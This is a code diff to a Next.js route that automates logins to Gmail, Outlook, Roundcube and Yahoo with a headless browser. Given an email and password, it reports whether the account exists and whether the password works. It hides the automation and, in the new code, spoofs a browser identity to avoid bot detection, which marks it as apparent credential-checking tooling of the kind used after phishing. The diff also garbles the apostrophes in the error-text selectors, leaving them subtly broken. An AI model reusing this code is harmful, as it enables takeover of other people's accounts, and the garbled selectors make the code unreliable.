@@ -1,5 +1,4 @@
-import { NextResponse } from "next/server";
-import puppeteer from "puppeteer-core";
+﻿import { NextResponse } from "next/server";
 import chromium from "@sparticuz/chromium-min";
 import dns from 'dns';
 import { promisify } from 'util';
@@ -8,7 +7,9 @@ import {
   isDev,
   userAgent,
   remoteExecutablePath,
+  launchBrowser,
 } from "@/utils/utils";
+import { applyIdentityToPage } from "@/utils/identity";
 
 const resolveMx = promisify(dns.resolveMx);
 
@@ -29,7 +30,7 @@ const platformSelectors = {
     nextButton: "#identifierNext",
     passwordInput: "input[name='Passwd']",
     passwordNextButton: "#passwordNext",
-    errorMessage: "//*[contains(text(), 'Couldn’t find your Google Account')]",
+    errorMessage: "//*[contains(text(), 'Couldnâ€™t find your Google Account')]",
     loginFailed: "//*[contains(text(), 'Wrong password')]",
   },
   outlook: {
@@ -37,7 +38,7 @@ const platformSelectors = {
     nextButton: "#idSIButton9",
     passwordInput: "input[name='passwd']",
     passwordNextButton: "#idSIButton9",
-    errorMessage: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesn’t exist')] | //*[contains(text(), 'find an account with that')]",
+    errorMessage: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesnâ€™t exist')] | //*[contains(text(), 'find an account with that')]",
     loginFailed: "//*[contains(text(), 'Your account or password is incorrect')]",
   },
   roundcube: {
@@ -53,7 +54,7 @@ const platformSelectors = {
     nextButton: "#login-signin",
     passwordInput: "input[name='password']",
     passwordNextButton: "#login-signin",
-    errorMessage: "//*[contains(text(), 'Sorry, we don’t recognize this email')] | //*[contains(text(), 'Sorry,')]",
+    errorMessage: "//*[contains(text(), 'Sorry, we donâ€™t recognize this email')] | //*[contains(text(), 'Sorry,')]",
     loginFailed: "//*[contains(text(), 'Invalid password')]",
   },
 };
@@ -91,16 +92,7 @@ async function checkAccountAccess(email, password) {
       throw new Error('Unsupported email service provider');
     }
     
-    browser = await puppeteer.launch({
-      ignoreDefaultArgs: ["--enable-automation"],
-      args: isDev
-        ? [
-            "--disable-blink-features=AutomationControlled",
-            "--disable-features=site-per-process",
-            "-disable-site-isolation-trials",
-          ]
-        : [...chromium.args, "--disable-blink-features=AutomationControlled"],
-      defaultViewport: { width: 1920, height: 1080 },
+    browser = await launchBrowser({
       executablePath: isDev
         ? localExecutablePath
         : await chromium.executablePath(remoteExecutablePath),
@@ -108,8 +100,12 @@ async function checkAccountAccess(email, password) {
     });
 
     const page = (await browser.pages())[0];
-    await page.setUserAgent(userAgent);
-    await page.setViewport({ width: 1920, height: 1080 });
+    if (browser.identity) {
+      await applyIdentityToPage(page, browser.identity);
+    } else {
+      await page.setUserAgent(userAgent);
+      await page.setViewport({ width: 1920, height: 1080 });
+    }
 
     await page.goto(platformUrls[platform], { waitUntil: "networkidle2", timeout: 60000 });
 
